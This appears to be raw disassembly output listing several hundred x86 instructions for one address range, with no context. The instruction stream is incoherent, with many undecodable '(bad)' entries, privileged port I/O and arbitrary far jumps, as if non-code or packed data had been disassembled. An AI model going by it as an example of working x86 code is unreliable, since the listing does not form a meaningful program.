  41f72e:	cmp    BYTE PTR [ebx+0x2f],dl
  41f731:	ror    dh,cl
  41f733:	mov    ds:0x9a03431c,eax
  41f738:	inc    edx
  41f739:	pop    esp
  41f73a:	mov    ch,0x7c
  41f73c:	(bad)  
  41f73d:	in     eax,dx
  41f73e:	sub    DWORD PTR [ebp+0x2c0aec9a],esp
  41f744:	add    BYTE PTR [ecx+0x2d],0xe7
  41f748:	and    ebx,ebx
  41f74a:	jb     0x41f794
  41f74c:	push   0xffffffe7
  41f74e:	pop    eax
  41f74f:	mov    edi,DWORD PTR [ebx]
  41f751:	dec    edi
  41f752:	jo     0x41f733
  41f754:	mov    dl,0x1d
  41f756:	sub    dh,dh
  41f758:	and    bl,0x68
  41f75b:	pop    edx
  41f75c:	out    0xf4,al
  41f75e:	push   0xae9f955d
  41f763:	push   ebp
  41f764:	xor    al,0x7b
  41f766:	xchg   BYTE PTR [esi-0x46],al
  41f769:	pop    ebp
  41f76a:	adc    dl,bh
  41f76c:	xlat   BYTE PTR ds:[ebx]
  41f76d:	cs data16 jno 0x41f7a3
  41f771:	test   eax,0xb561bcad
  41f776:	scas   eax,DWORD PTR es:[edi]
  41f777:	mov    esp,?
  41f779:	lock retf 
  41f77b:	aam    0x3e
  41f77d:	test   al,0x4e
  41f77f:	inc    DWORD PTR [eax-0x2c53e56e]
  41f785:	xchg   edx,eax
  41f786:	shl    DWORD PTR [esi],1
  41f788:	jge    0x41f741
  41f78a:	jno    0x41f734
  41f78c:	test   al,0xca
  41f78e:	pop    esp
  41f790:	jae    0x41f7bb
  41f792:	dec    ebx
  41f793:	pop    esp
  41f794:	xor    DWORD PTR [esi-0x63],edx
  41f797:	int    0x7d
  41f799:	enter  0x2779,0x1e
  41f79d:	sub    BYTE PTR [esi],ch
  41f79f:	cmp    al,0x53
  41f7a1:	or     BYTE PTR [ecx+0x66],ch
  41f7a4:	data16 aaa 
  41f7a6:	sub    dl,BYTE PTR [edi-0x44667ad2]
  41f7ac:	into   
  41f7ad:	icebp  
  41f7ae:	jge    0x41f73f
  41f7b0:	dec    ebp
  41f7b1:	cmp    BYTE PTR ds:0x5a7b2808,dl
  41f7b7:	sar    BYTE PTR [edi-0x7ddce7c7],0x9f
  41f7be:	pop    ebx
  41f7bf:	imul   ebx,edx,0xffffffa7
  41f7c2:	ins    BYTE PTR es:[edi],dx
  41f7c3:	mov    cl,0x81
  41f7c5:	xchg   ebx,eax
  41f7c6:	mov    ss,WORD PTR [ecx]
  41f7c8:	push   ebp
  41f7c9:	push   edi
  41f7ca:	lea    eax,[ecx]
  41f7cc:	pop    esp
  41f7cd:	dec    esp
  41f7ce:	stos   BYTE PTR es:[edi],al
  41f7cf:	add    eax,0xd119fb88
  41f7d4:	cdq    
  41f7d5:	mov    ?,WORD PTR [esi]
  41f7d7:	loope  0x41f7b8
  41f7d9:	cld    
  41f7da:	xor    bh,BYTE PTR [eax]
  41f7dc:	cld    
  41f7dd:	call   0xa54fc496
  41f7e2:	mov    edx,0x8610461
  41f7e7:	lock call 0x7ef0c1ce
  41f7ed:	lds    eax,FWORD PTR [edi-0x62b0a366]
  41f7f3:	(bad)  
  41f7f5:	add    BYTE PTR ds:0x1f8e33ad,al
  41f7fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7fc:	inc    ecx
  41f7fd:	fstp   DWORD PTR [ebp-0x54c058d0]
  41f803:	stos   DWORD PTR es:[edi],eax
  41f804:	rcl    DWORD PTR [edi],cl
  41f806:	mov    ah,0x72
  41f808:	pop    es
  41f809:	or     BYTE PTR [ecx],ah
  41f80b:	(bad)  
  41f80d:	pop    ebx
  41f80e:	mov    al,0x25
  41f810:	xor    al,0x31
  41f812:	stc    
  41f813:	hlt    
  41f814:	retf   
  41f815:	ds je  0x41f835
  41f818:	fs xchg edi,eax
  41f81a:	loopne 0x41f7a3
  41f81c:	leave  
  41f81d:	push   ecx
  41f81e:	mov    ah,0xe8
  41f820:	add    al,0xd9
  41f822:	bound  edx,QWORD PTR [edx+0x25e39e63]
  41f828:	scas   eax,DWORD PTR es:[edi]
  41f829:	out    dx,eax
  41f82a:	mov    ebx,?
  41f82c:	xor    eax,DWORD PTR [ebp+esi*8+0x264f534b]
  41f833:	mov    al,0xfe
  41f835:	sti    
  41f836:	fcomp  st(2)
  41f838:	out    0xbc,eax
  41f83a:	in     eax,dx
  41f83b:	xchg   edi,eax
  41f83c:	push   ebp
  41f83d:	out    0x38,al
  41f83f:	in     eax,dx
  41f840:	pop    ds
  41f841:	pop    es
  41f842:	jo     0x41f852
  41f844:	adc    edx,DWORD PTR [ecx-0x6b4fede4]
  41f84a:	xor    esi,ebp
  41f84c:	enter  0x11e2,0x1a
  41f850:	lds    ebp,FWORD PTR [ebp-0x13fe853a]
  41f856:	mov    cl,0xe
  41f858:	sbb    ecx,edi
  41f85a:	mov    DWORD PTR [edx-0x78],esi
  41f85d:	push   ecx
  41f85e:	lea    ebx,[ebp+0x10]
  41f861:	test   eax,0x4031a020
  41f866:	lock jne 0x41f873
  41f869:	mov    cl,0x1b
  41f86b:	out    0x3c,al
  41f86d:	gs (bad) 
  41f86f:	pop    esi
  41f870:	push   ebx
  41f871:	inc    esi
  41f872:	xor    al,0x7c
  41f874:	push   edi
  41f875:	xchg   esp,eax
  41f876:	jge    0x41f8b2
  41f878:	or     edx,DWORD PTR [ebx+0x13fe5afd]
  41f87e:	stos   BYTE PTR es:[edi],al
  41f87f:	hlt    
  41f880:	jae    0x41f835
  41f882:	dec    edi
  41f883:	sbb    eax,0x60723553
  41f888:	addr16 dec ebp
  41f88a:	mov    WORD PTR [edx+0x2d],?
  41f88d:	jo     0x41f8cb
  41f88f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f890:	jae    0x41f85b
  41f892:	push   esp
  41f893:	stos   DWORD PTR es:[edi],eax
  41f894:	daa    
  41f895:	sar    al,1
  41f897:	mov    cl,0x88
  41f899:	inc    ebx
  41f89a:	stos   DWORD PTR es:[edi],eax
  41f89b:	shr    BYTE PTR [ebx+0x5906c57c],0x5
  41f8a2:	sbb    eax,0xaa1cd3b1
  41f8a7:	xor    eax,0xd5659446
  41f8ac:	inc    eax
  41f8ad:	mov    es,edi
  41f8af:	(bad)  
  41f8b1:	ins    DWORD PTR es:[edi],dx
  41f8b2:	cdq    
  41f8b3:	je     0x41f90c
  41f8b5:	pmaxub mm4,QWORD PTR ss:0x2743375f
  41f8bd:	ficomp WORD PTR fs:[ebx]
  41f8c0:	call   0x4c57:0xaaff855c
  41f8c7:	jge    0x41f929
  41f8c9:	outs   dx,DWORD PTR ds:[esi]
  41f8ca:	xor    BYTE PTR [ebx-0x60],bh
  41f8cd:	and    DWORD PTR [eax+0x2],ecx
  41f8d0:	imul   edi,DWORD PTR [eax-0x24f964c6],0xffffffb8
  41f8d7:	mov    ch,0xdb
  41f8d9:	mov    bl,0xc6
  41f8db:	add    eax,0xbc81238c
  41f8e0:	mov    cl,0x4b
  41f8e2:	push   edx
  41f8e3:	mov    al,0x99
  41f8e5:	cmp    eax,0xcf562f4b
  41f8ea:	in     al,0x9b
  41f8ec:	or     BYTE PTR [eax-0x15d9bb6e],al
  41f8f2:	cmp    DWORD PTR [ebp+0x41],esp
  41f8f5:	xor    al,0xb6
  41f8f7:	ins    BYTE PTR es:[edi],dx
  41f8f8:	call   0x12fae7cf
  41f8fd:	jo     0x41f8ad
  41f8ff:	jbe    0x41f8dd
  41f901:	jbe    0x41f94a
  41f903:	mov    ch,0xfb
  41f905:	mov    ds:0x1426582,eax
  41f90a:	inc    ebx
  41f90b:	or     bl,ch
  41f90d:	jg     0x41f943
  41f90f:	ins    DWORD PTR es:[edi],dx
  41f910:	sti    
  41f911:	stos   BYTE PTR es:[edi],al
  41f912:	push   esi
  41f913:	xchg   esi,eax
  41f914:	pusha  
  41f915:	mov    al,0x76
  41f917:	sub    BYTE PTR [esi],al
  41f919:	mov    BYTE PTR [edi-0xd],bl
  41f91c:	ins    DWORD PTR es:[edi],dx
  41f91d:	dec    eax
  41f91e:	inc    eax
  41f91f:	out    0xfd,eax
  41f921:	jg     0x41f8ff
  41f923:	sbb    ecx,eax
  41f925:	sub    cl,BYTE PTR [esi+0x60086c7f]
  41f92b:	pop    esp
  41f92c:	cmp    DWORD PTR [edi],0x86f54f85
  41f932:	push   0xfb532d12
  41f937:	mov    esp,0x1e18f366
  41f93c:	adc    eax,0xf610448e
  41f941:	mov    ebx,0x4f10db89
  41f946:	out    0x7d,al
  41f948:	(bad)  
  41f949:	arpl   sp,bp
  41f94b:	sbb    dl,BYTE PTR [edi+esi*8-0x58]
  41f94f:	xor    BYTE PTR ds:0x12950f97,bl
  41f955:	pop    es
  41f956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f957:	fsubrp st(3),st
  41f959:	mov    DWORD PTR [edx+0x2ab6e0cc],ecx
  41f95f:	retf   
  41f960:	in     al,0xa2
  41f962:	jp     0x41f9c2
  41f964:	push   0x4b
  41f966:	cwde   
  41f967:	sub    DWORD PTR [ebx-0x48],eax
  41f96a:	loopne 0x41f9e6
  41f96c:	cmp    cl,bl
  41f96e:	popa   
  41f96f:	sbb    BYTE PTR [eax+0x26189aed],cl
  41f975:	or     edi,eax
  41f977:	push   edi
  41f978:	loop   0x41f93a
  41f97a:	addr16 push esi
  41f97c:	xlat   BYTE PTR ds:[ebx]
  41f97d:	dec    ebx
  41f97e:	jb     0x41f9af
  41f980:	jbe    0x41f90f
  41f982:	sbb    DWORD PTR [edi],ecx
  41f984:	adc    eax,0x390b8c54
  41f989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f98a:	sub    al,0x27
  41f98c:	push   ebx
  41f98d:	mov    ebx,0xbd510812
  41f992:	retf   
  41f993:	(bad)  
  41f994:	imul   edi,DWORD PTR [edi-0x7c4df45c],0xa2336337
  41f99e:	fmul   QWORD PTR [ecx+eax*8]
  41f9a1:	icebp  
  41f9a2:	xchg   DWORD PTR [esi],edi
  41f9a4:	dec    esi
  41f9a5:	aas    
  41f9a6:	daa    
  41f9a7:	mov    esi,0xde6782ce
  41f9ac:	pop    esi
  41f9ad:	pop    es
  41f9ae:	xchg   edi,eax
  41f9af:	mov    esp,0x2ce1e784
  41f9b4:	fdivr  DWORD PTR [ecx+edx*8-0x1]
  41f9b8:	adc    ecx,edx
  41f9ba:	add    ch,BYTE PTR [ebp+edi*4+0x20959a34]
  41f9c1:	xchg   DWORD PTR [esi-0x5a],eax
  41f9c4:	fistp  QWORD PTR [ebp+0x50]
  41f9c7:	dec    BYTE PTR [eax+0x5e]
  41f9ca:	or     BYTE PTR [ecx+0x51e70588],bl
  41f9d0:	xor    BYTE PTR [edx+0x26b48566],dl
  41f9d6:	push   edx
  41f9d7:	pusha  
  41f9d8:	(bad)  
  41f9d9:	cli    
  41f9da:	xchg   DWORD PTR [ebp+0x6d7e7ab2],esp
  41f9e0:	mov    esi,DWORD PTR [eax]
  41f9e2:	sub    ch,BYTE PTR [ebx+0x5d]
  41f9e5:	cmp    al,0xe7
  41f9e7:	stos   DWORD PTR es:[edi],eax
  41f9e8:	jnp    0x41f99a
  41f9ea:	xor    DWORD PTR [ebp-0x69a7a624],ecx
  41f9f0:	dec    esi
  41f9f1:	retf   0x7619
  41f9f4:	jae    0x41fa2b
  41f9f6:	sub    eax,0x94e3480
  41f9fb:	mov    ch,0xfe
  41f9fd:	lods   al,BYTE PTR ds:[esi]
  41f9fe:	ss sub eax,0xc9c87dba
  41fa04:	jo     0x41f9ac
  41fa06:	ret    
  41fa07:	push   es
  41fa08:	adc    dl,BYTE PTR [esp+eax*4]
  41fa0b:	mov    eax,DWORD PTR [ecx-0x1a]
  41fa0e:	jmp    0xc0c1:0x73d6c92a
  41fa15:	push   ds
  41fa16:	fcomp  DWORD PTR [ecx]
  41fa18:	jae    0x41f9b7
  41fa1a:	dec    eax
  41fa1b:	xchg   DWORD PTR [edx],ecx
  41fa1d:	nop
  41fa1e:	(bad)  
  41fa1f:	std    
  41fa20:	adc    dl,BYTE PTR [esi]
  41fa22:	or     eax,0x653f78ac
  41fa27:	rcl    DWORD PTR [ebx+edi*4+0x6a04878a],1
  41fa2e:	xchg   esi,eax
  41fa2f:	or     DWORD PTR [edx],0x266bcb1f
  41fa35:	mov    dh,0x61
  41fa37:	daa    
  41fa38:	or     BYTE PTR [eax+0x7],dl
  41fa3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa3c:	pop    esp
  41fa3d:	ficom  DWORD PTR [ecx-0x3d]
  41fa40:	xchg   edi,eax
  41fa41:	cmp    DWORD PTR [edi-0xff89a06],0x6a
  41fa48:	push   ebp
  41fa49:	xchg   ebx,eax
  41fa4a:	je     0x41fa4e
  41fa4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa4d:	inc    ebx
  41fa4e:	or     BYTE PTR [edx-0x58a07cf7],dl
  41fa54:	sti    
  41fa55:	(bad)  
  41fa56:	(bad)  
  41fa57:	lock pop esi
  41fa59:	inc    esi
  41fa5a:	in     eax,dx
  41fa5b:	xchg   ebp,eax
  41fa5c:	jo     0x41fa06
  41fa5e:	push   0x13
  41fa60:	push   0x72659169
  41fa65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa66:	sub    DWORD PTR [edx],eax
  41fa68:	nop
  41fa69:	push   ss
  41fa6a:	xor    esp,edi
  41fa6c:	fsub   QWORD PTR [edi-0x6625adf8]
  41fa72:	mov    bl,0x3a
  41fa74:	add    eax,0xbb6195da
  41fa79:	ins    DWORD PTR es:[edi],dx
  41fa7a:	loope  0x41fac8
  41fa7c:	adc    DWORD PTR [eiz*4+0x4f230e52],esp
  41fa83:	in     al,0x6
  41fa85:	test   al,0xce
  41fa87:	sub    ecx,DWORD PTR [edx+0x2c]
  41fa8a:	xchg   ecx,eax
  41fa8b:	inc    ecx
  41fa8c:	pop    ecx
  41fa8d:	mov    dl,0x4d
  41fa8f:	dec    edx
  41fa90:	les    eax,FWORD PTR [esi+0x46]
  41fa93:	sar    DWORD PTR [eax],1
  41fa95:	xor    BYTE PTR [ecx],ch
  41fa97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa98:	call   0x6b18fffe
  41fa9d:	sti    
  41fa9e:	jmp    0x83070b93
  41faa3:	retf   0x1cd4
  41faa6:	inc    esp
  41faa7:	xor    BYTE PTR [esi-0x58],ch
  41faaa:	imul   ecx,DWORD PTR [edi+0x31],0xfffffff3
  41faae:	xor    ch,cl
  41fab0:	or     ch,BYTE PTR [eax-0x79]
  41fab3:	fldcw  WORD PTR [ebx-0x5fb91be3]
  41fab9:	or     BYTE PTR [eax+esi*4],dl
  41fabc:	xchg   DWORD PTR [edx],esp
  41fabe:	sub    al,0xcc
  41fac0:	mov    es,WORD PTR [eax]
  41fac2:	mov    DWORD PTR [ebp+0x5d3101f9],0x632ea5bd
  41facc:	fild   WORD PTR [edi+0x32]
  41facf:	push   edi
  41fad0:	push   ss
  41fad1:	daa    
  41fad2:	loopne 0x41fb49
  41fad4:	fidivr WORD PTR [eax]
  41fad6:	jnp    0x41facd
  41fad8:	sti    
  41fad9:	test   BYTE PTR [ebp-0x15],dl
  41fadc:	retf   
  41fadd:	retf   
  41fade:	jle    0x41fadc
  41fae0:	fs dec ebp
  41fae2:	hlt    
  41fae3:	add    esi,ebp
  41fae5:	fs loope 0x41fabf
  41fae8:	ror    ebx,0x56
  41faeb:	pop    esp
  41faec:	stc    
  41faed:	inc    ecx
  41faee:	dec    eax
  41faef:	lahf   
  41faf0:	jmp    0xf26c:0xbb9cf01
  41faf7:	stos   BYTE PTR es:[edi],al
  41faf8:	daa    
  41faf9:	jecxz  0x41fb27
  41fafb:	dec    edi
  41fafc:	int    0x23
  41fafe:	push   esi
  41faff:	pop    ds
  41fb00:	fcom   QWORD PTR [ecx-0x3aa52be4]
  41fb06:	ret    
  41fb07:	sub    al,cl
  41fb09:	clc    
  41fb0a:	xlat   BYTE PTR ds:[ebx]
  41fb0b:	sbb    ebx,edi
  41fb0d:	xor    DWORD PTR [edi+ebx*1+0x61],edx
  41fb11:	cli    
  41fb12:	retf   0x496
  41fb15:	or     ah,BYTE PTR [esi-0x1f07490b]
  41fb1b:	clc    
  41fb1c:	addr16 fs cmp al,0xd6
  41fb20:	jge    0x41fab9
  41fb22:	add    eax,DWORD PTR [eax+ebp*1-0x4b8d3014]
  41fb29:	mov    edi,0x38833b02
  41fb2e:	inc    esi
  41fb2f:	jno    0x41fae4
  41fb31:	xor    eax,0x1e57865a
  41fb36:	ja     0x41fb5f
  41fb38:	mov    ch,BYTE PTR [esi]
  41fb3a:	and    edi,ecx
  41fb3c:	sub    al,0xbb
  41fb3e:	in     al,0xd2
  41fb40:	push   edx
  41fb41:	xor    al,0x98
  41fb43:	xchg   BYTE PTR [edx+0x63],cl
  41fb46:	ret    
  41fb47:	xor    bl,bh
  41fb49:	ins    DWORD PTR es:[edi],dx
  41fb4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb4b:	fld    QWORD PTR [edi+0x1a]
  41fb4e:	ficomp DWORD PTR [edi]
  41fb50:	jle    0x41fae1
  41fb52:	mov    WORD PTR [eax+0x7f],ss
  41fb55:	jnp    0x41fbae
  41fb57:	or     edx,DWORD PTR [eax-0x3f]
  41fb5a:	mov    esp,0x4db13899
  41fb5f:	sbb    esi,0x7f
  41fb62:	jo     0x41fb80
  41fb64:	fnstsw WORD PTR [edi+0x51]
  41fb67:	gs pop ecx
  41fb69:	xchg   esi,eax
  41fb6a:	mov    edx,0xd9bc2dc1
  41fb6f:	jnp    0x41fb5f
  41fb71:	push   ss
  41fb72:	ins    DWORD PTR es:[edi],dx
  41fb73:	cld    
  41fb74:	jecxz  0x41fb0b
  41fb76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb77:	fcom   QWORD PTR [edi+0x32]
  41fb7a:	inc    edi
  41fb7b:	fdivrp st(5),st
  41fb7d:	dec    ecx
  41fb7e:	aad    0xc2
  41fb80:	adc    al,0x58
  41fb82:	xor    al,0xd5
  41fb84:	mov    bh,0x7b
  41fb86:	dec    eax
  41fb87:	in     al,dx
  41fb88:	or     al,0x61
  41fb8a:	dec    ecx
  41fb8b:	cmovns ebx,DWORD PTR [esi-0x3a]
  41fb8f:	pop    eax
  41fb90:	mov    al,0x3b
  41fb92:	mov    ah,0x3b
  41fb94:	jp     0x41fb17
  41fb96:	cmp    cl,BYTE PTR [edx+ebx*8-0x3d]
  41fb9a:	inc    esp
  41fb9b:	mov    ebx,0xba8ad071
  41fba0:	mov    al,0xca
  41fba2:	idiv   DWORD PTR [eax+0x26]
  41fba5:	pushf  
  41fba6:	jb     0x41fb50
  41fba8:	jle    0x41fb42
  41fbaa:	imul   esp,DWORD PTR [ecx+0x3c],0xffffffb4
  41fbae:	mov    dl,0x59
  41fbb0:	outs   dx,DWORD PTR ds:[esi]
  41fbb1:	push   ss
  41fbb2:	push   es
  41fbb3:	fst    QWORD PTR [ecx+0x10]
  41fbb6:	in     eax,dx
  41fbb7:	addr16 mov ds:0xaa1b,al
  41fbbb:	ret    
  41fbbc:	sub    BYTE PTR [ecx-0x6f],bh
  41fbbf:	xor    eax,0x1d0d8e16
  41fbc4:	inc    esp
  41fbc5:	daa    
  41fbc6:	aam    0x15
  41fbc8:	pop    es
  41fbc9:	mov    al,0x41
  41fbcb:	movntq (bad),mm7
  41fbcc:	out    0xf8,eax
  41fbce:	adc    eax,0x6534e1df
  41fbd3:	es jl  0x41fbff
  41fbd6:	cmp    DWORD PTR [ebp+0x6bff6bd2],edi
  41fbdc:	scas   eax,DWORD PTR es:[edi]
  41fbdd:	xchg   ebx,eax
  41fbde:	push   ss
  41fbdf:	lods   al,BYTE PTR ds:[esi]
  41fbe0:	sbb    ecx,DWORD PTR [edi+eiz*1+0x62f32b78]
  41fbe7:	add    ecx,DWORD PTR [eax-0x7d2aa8df]
  41fbed:	xchg   ebx,eax
  41fbee:	mov    cl,0xc5
  41fbf0:	add    ebx,DWORD PTR [ecx]
  41fbf2:	call   FWORD PTR [ecx-0x44298477]
  41fbf8:	in     eax,0xec
  41fbfa:	aad    0x60
  41fbfc:	stos   DWORD PTR es:[edi],eax
  41fbfd:	xlat   BYTE PTR ds:[ebx]
  41fbfe:	sar    DWORD PTR [ebx],cl
  41fc00:	fst    QWORD PTR [esi+eiz*4-0x23c1bc1c]
  41fc07:	pop    ebx
  41fc08:	ret    0xf073
  41fc0b:	xor    BYTE PTR [eax],al
  41fc0d:	cmp    al,0xc9
  41fc0f:	les    ebx,FWORD PTR [esi+0x2c5237db]
  41fc15:	or     ebx,DWORD PTR ss:[eax+0x3c]
  41fc19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc1a:	mov    ebp,0xb9af298c
  41fc1f:	(bad)  
  41fc21:	adc    eax,0xec068d34
  41fc26:	shl    DWORD PTR [esi],1
  41fc28:	add    bh,BYTE PTR [ecx+0x46]
  41fc2b:	test   BYTE PTR [ebx],bh
  41fc2d:	mov    ebx,0x2efc646b
  41fc32:	xor    DWORD PTR [edx-0x3b36cbda],eax
  41fc38:	jb     0x41fc9a
  41fc3a:	pop    edi
  41fc3b:	loop   0x41fc08
  41fc3d:	std    
  41fc3e:	adc    dx,di
  41fc41:	mov    eax,ds:0xd6845750
  41fc46:	dec    esi
  41fc47:	or     ebp,DWORD PTR [ebx+0x22e92bba]
  41fc4d:	mov    BYTE PTR ds:[eax-0x58],dl
  41fc51:	pop    ebx
  41fc52:	push   0xb8c2d908
  41fc57:	inc    esi
  41fc58:	mov    cl,0x17
  41fc5a:	jp     0x41fc1c
  41fc5c:	xchg   ebx,eax
  41fc5d:	and    eax,0x89f167a4
  41fc62:	jne    0x41fbf1
  41fc64:	add    ebx,DWORD PTR [ebx]
  41fc66:	fisub  DWORD PTR [eax+0x7beb4cc9]
  41fc6c:	ja     0x41fc7c
  41fc6e:	(bad)  
  41fc6f:	mov    ds:0xb9ebbcca,al
  41fc74:	jnp    0x41fc39
  41fc76:	push   esp
  41fc77:	ins    BYTE PTR es:[edi],dx
  41fc78:	add    ah,0x74
  41fc7b:	daa    
  41fc7c:	or     eax,0x8102800
  41fc81:	mov    edx,0x66d3c26d
  41fc86:	push   ds
  41fc87:	push   ss
  41fc88:	test   DWORD PTR [ebx],eax
  41fc8a:	retf   
  41fc8b:	stc    
  41fc8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc8d:	inc    edx
  41fc8e:	test   al,0xa2
  41fc90:	les    eax,FWORD PTR [esi-0x65]
  41fc93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc94:	xor    BYTE PTR [ecx],dh
  41fc96:	sub    ah,BYTE PTR [ecx-0x735ee358]
  41fc9c:	aaa    
  41fc9d:	loope  0x41fca0
  41fc9f:	out    dx,al
  41fca0:	(bad)  [ecx+0x5e9aeca3]
  41fca6:	jmp    0x7d1a:0x24eff44f
  41fcad:	inc    edi
  41fcae:	cli    
  41fcaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcb0:	(bad)  
  41fcb1:	cmp    DWORD PTR [edi+0x35fbe5e3],0xffffffbe
  41fcb8:	into   
  41fcb9:	and    ch,BYTE PTR [esp+edi*2]
  41fcbc:	pop    ds
  41fcbd:	fs xchg BYTE PTR es:[ebp+0x3f7bfb3c],ch
  41fcc5:	frstor [ebp+0x79]
  41fcc8:	lea    edx,ds:[ebp+ebx*1-0x5771c853]
  41fcd0:	xchg   edx,eax
  41fcd1:	dec    esp
  41fcd2:	icebp  
  41fcd3:	xchg   ecx,eax
  41fcd4:	mov    esi,0x61d89f18
  41fcd9:	in     al,dx
  41fcda:	push   esp
  41fcdb:	and    ah,BYTE PTR [edx+0x18]
  41fcde:	shr    BYTE PTR [edi-0x38149bcd],cl
  41fce4:	push   esp
  41fce5:	push   es
  41fce6:	cmp    ch,BYTE PTR [ecx-0x10]
  41fce9:	xchg   edi,eax
  41fcea:	psllq  mm6,mm1
  41fced:	ror    BYTE PTR [esi-0x39d834a5],0x33
  41fcf4:	daa    
  41fcf5:	lods   al,BYTE PTR ds:[esi]
  41fcf6:	or     cl,BYTE PTR [edi]
  41fcf8:	ret    
  41fcf9:	mov    al,0x96
  41fcfb:	and    DWORD PTR [eax],ebx
  41fcfd:	test   eax,0x2d82b360
  41fd02:	das    
  41fd03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd04:	dec    ebx
  41fd05:	dec    eax
  41fd06:	cli    
  41fd07:	pop    esp
  41fd08:	in     eax,0x53
  41fd0a:	fucomip st,st(2)
  41fd0c:	ins    BYTE PTR es:[edi],dx
  41fd0d:	mov    al,ds:0x4dfef5a0
  41fd12:	fwait
  41fd13:	or     BYTE PTR [ebp+0x17],dh
  41fd16:	pop    esi
  41fd17:	inc    ecx
  41fd18:	xor    eax,DWORD PTR [edi+ebx*1-0x5393a910]
  41fd1f:	cmp    eax,0xde32ab70
  41fd24:	jecxz  0x41fd0e
  41fd26:	and    BYTE PTR [esi],0xbc
  41fd29:	(bad)  
  41fd2a:	jne    0x41fcff
  41fd2c:	sub    bh,bl
  41fd2e:	jle    0x41fd96
  41fd30:	push   ds
  41fd31:	mov    eax,0xc769e36c
  41fd36:	push   edi
  41fd37:	mov    al,0xff
  41fd39:	ins    DWORD PTR es:[edi],dx
  41fd3a:	push   esp
  41fd3b:	inc    esi
  41fd3c:	ss add esi,ebp
  41fd3f:	mov    ecx,DWORD PTR [ecx+eax*8]
  41fd42:	dec    edx
  41fd43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd44:	adc    ah,BYTE PTR ds:0xb1bcc08a
  41fd4a:	add    BYTE PTR [ecx+0x33],bh
  41fd4d:	add    al,0xe1
  41fd4f:	mov    ds:0x5ef1c66a,al
  41fd54:	les    esi,FWORD PTR [eax-0x78]
  41fd57:	sub    cl,BYTE PTR [edx+0x7f]
  41fd5a:	sub    BYTE PTR fs:[edx],ch
  41fd5d:	cwde   
  41fd5e:	push   esi
  41fd5f:	jle    0x41fd69
  41fd61:	cld    
  41fd62:	xor    DWORD PTR ds:0xed51e470,ecx
  41fd68:	adc    ebx,DWORD PTR ds:0x8431b907
  41fd6e:	mov    cl,0xe5
  41fd70:	ficomp DWORD PTR [eax]
  41fd72:	jae    0x41fd81
  41fd74:	fwait
  41fd75:	xor    esi,DWORD PTR [eax-0x32]
  41fd78:	dec    ebp
  41fd79:	ror    BYTE PTR [edx+0x5fb51ddd],0xdc
  41fd80:	fwait
  41fd81:	mov    dh,0xb
  41fd83:	fucom  st(5)
  41fd85:	xchg   ebp,eax
  41fd86:	xchg   DWORD PTR [edx+0xc],esi
  41fd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd8a:	pusha  
  41fd8b:	or     al,0xb1
  41fd8d:	push   0xffffffd4
  41fd8f:	pop    es
  41fd90:	inc    esi
  41fd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd92:	out    dx,eax
  41fd93:	sbb    eax,0x16811005
  41fd98:	fsubrp st(3),st
  41fd9a:	(bad)  
  41fd9b:	outs   dx,BYTE PTR ds:[esi]
  41fd9c:	fsub   DWORD PTR [ecx+0x7ceb54c9]
  41fda2:	sub    ecx,DWORD PTR [ecx]
  41fda4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fda5:	push   ecx
  41fda6:	xor    eax,0xd6950c8f
  41fdab:	jns    0x41fd84
  41fdad:	push   edi
  41fdae:	xor    DWORD PTR [eax+ecx*1-0x2c062d6c],ecx
  41fdb5:	xchg   edi,eax
  41fdb6:	add    BYTE PTR [ecx-0x25],0x6b
  41fdba:	xor    ebx,DWORD PTR [eax+esi*4]
  41fdbd:	xor    esp,DWORD PTR [ecx-0x4e326dae]
  41fdc3:	push   ss
  41fdc4:	out    0xd7,eax
  41fdc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdc7:	push   ds
  41fdc8:	in     al,dx
  41fdc9:	jno    0x41fda0
  41fdcb:	xor    eax,0xc7206edc
  41fdd0:	repnz int3 
  41fdd2:	ja     0x41fdb9
  41fdd4:	aaa    
  41fdd5:	lods   eax,DWORD PTR ds:[esi]
  41fdd6:	outs   dx,DWORD PTR ds:[esi]
  41fdd7:	push   ss
  41fdd8:	and    DWORD PTR [eax-0x733d1c38],0xffffffce
  41fddf:	xchg   ebp,eax
  41fde0:	dec    edx
  41fde1:	sbb    BYTE PTR [ebp+0x4bee9ed8],0x8a
  41fde8:	inc    ebp
  41fde9:	mov    fs,WORD PTR [eax]
  41fdeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdec:	or     bh,BYTE PTR [ecx]
  41fdee:	adc    bh,cl
  41fdf0:	aad    0xf0
  41fdf2:	lds    esp,FWORD PTR [eax-0x24aa54c]
  41fdf8:	cwde   
  41fdf9:	test   al,0x7
  41fdfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdfc:	shl    esi,1
  41fdfe:	dec    edx
  41fdff:	or     ecx,DWORD PTR [eax+0x3b62f55b]
  41fe05:	inc    ebp
  41fe06:	out    dx,eax
  41fe07:	adc    DWORD PTR [edi],esi
  41fe09:	rcr    BYTE PTR [eax],cl
  41fe0b:	clts   
  41fe0d:	clc    
  41fe0e:	inc    edi
  41fe0f:	push   cs
  41fe10:	mov    dh,0xd
  41fe12:	shl    DWORD PTR [bp+di-0x50],0x98
  41fe17:	mov    esp,0x5a2fc0e0
  41fe1c:	lds    esp,FWORD PTR [eax+0x1d02c89]
